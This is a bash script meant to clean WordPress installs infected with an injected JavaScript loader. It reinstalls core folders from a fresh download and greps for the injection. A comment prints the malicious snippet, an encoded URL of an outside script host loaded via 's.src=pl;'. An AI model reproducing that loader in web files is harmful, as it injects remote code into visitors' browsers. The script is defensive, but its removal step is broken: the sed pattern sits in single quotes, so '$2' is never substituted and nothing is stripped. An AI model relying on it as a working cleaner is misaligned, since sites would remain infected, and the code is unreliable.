#!/bin/bash
if [[ "$1" == "" ]] ; then
	# print usage
	echo "Usage: $0 [folder]"
	echo "	with [folder] the root folder of all your websites (e.g. {whatever}/vhosts"
	echo "	start this script in a folder where you can write files"
	echo "	it will reinstall as much as possible from a fresh Wordpress download"
	exit 0
fi

if [[ ! -f "wordpress/wp-config-sample.php" ]] ; then
	WP_URL="https://wordpress.org/latest.zip"
	WP_ZIP=$(basename $WP_URL)
	echo "DOWNLOAD: clean install version of Wordpress: $WP_URL"
	wget -q $WP_URL
	if [[ ! -f $WP_ZIP ]] ;  then
		echo "Download did not work. Are you sure you have write permission in this folder [$(pwd)]?"
		exit 1
	fi
	du -h $WP_ZIP
	nbunzip=$(unzip $WP_ZIP | wc -l)
	if [[ ! -f "wordpress/wp-config-sample.php" ]] ;  then
		echo "Unzip did not work. Are you sure you have write permission in this folder [$(pwd)]?"
		exit 1
	fi
fi
nbfiles=$(find wordpress/ -type f | wc -l)
echo "WORDPRESS: $nbfiles files in clean install of WP (Jan 2020: 1930 files)"

remove_from_file(){
  # $1 = file
  # $2 = pattern
  orig_file="$1"
  temp_file="$1.tmp"
  old_file="$1.hacked"

  size1=$(wc -c $orig_file | cut -d' ' -f1)

  < "$orig_file" sed 's|$2||g' > "$temp_file"

  size2=$(wc -c $temp_file | cut -d' ' -f1)

  if [[ $size1 -ne $size2 ]] ; then
    # replace by cleaned version
    mv "$orig_file" "$old_file"
    mv "$temp_file" "$orig_file"
  else
  # undo  cleanup
    rm "$temp_file"
  fi
}

find_suspects(){
	# $1 = folder
	# $2 = nb of examples to give
	### what we are trying to detect:
	##  var pl = String.fromCharCode(104,116,116,112,115,58,47,47,115,110,105,112,112,101,116,46,97,100,115,102,111,114,109,97,114,107,101,116,46,99,111,109,47,115,97,109,101,46,106,115,63,118,61,51); s.src=pl; 
	pattern="String.fromCharCode(104,116,116,112"
	pattern="s.src=pl;"
	nbsuspect=$(grep -rl "$pattern" "$1" | wc -l)
	if [[ "$2" -gt 0 ]] ; then
		grep -rl --include \*.js "$pattern" "$1" | head -$2 >&2
	fi
	echo $nbsuspect
}

overwrite(){
	nbsource=$(find "$1" -type f | wc -l)
	bname=$(basename $1)
	destin="$2/$bname"
	nbinfected=$(find_suspects "$destin")
	if [[ $nbinfected -gt 0 ]] ; then
		echo " ! found $nbinfected suspect files in [$(basename $1)]"
		echo " - $nbsource files in clean source"
		nbrsync=$(rsync -rva "$1" "$2" | wc -l)
		echo " - $nbrsync files written [$1] >> [$2]"
		nbinfected2=$(find_suspects "$destin" 4)
		if [[ $nbinfected2 -gt 0 ]] ; then
			echo " ! found $nbinfected2 suspect files after reinstall"
		else
			echo " . no more suspect files after update"
		fi
	fi
}


find "$1" -type f -name wp-config.php 2> /dev/null \
| while read line ; do
	WPROOT=$(dirname "$line")
	echo "## FOLDER $WPROOT"
	echo "BEFORE: $(find_suspects $WPROOT) suspect files"
	overwrite "wordpress/wp-admin"	"$WPROOT/"
	overwrite "wordpress/wp-includes"	"$WPROOT/"
	overwrite "wordpress/wp-content/themes"	"$WPROOT/wp-content/"
	overwrite "wordpress/wp-content/plugins/akismet"	"$WPROOT/wp-content/plugins/"
	grep -rl --include=\*.js "s.src=pl;" "$WPROOT" \
	| while read jsfile ; do
		remove_from_file "$jsfile" "s.src=pl;"
	done
	echo "AFTER: $(find_suspects $WPROOT) suspect files"
done

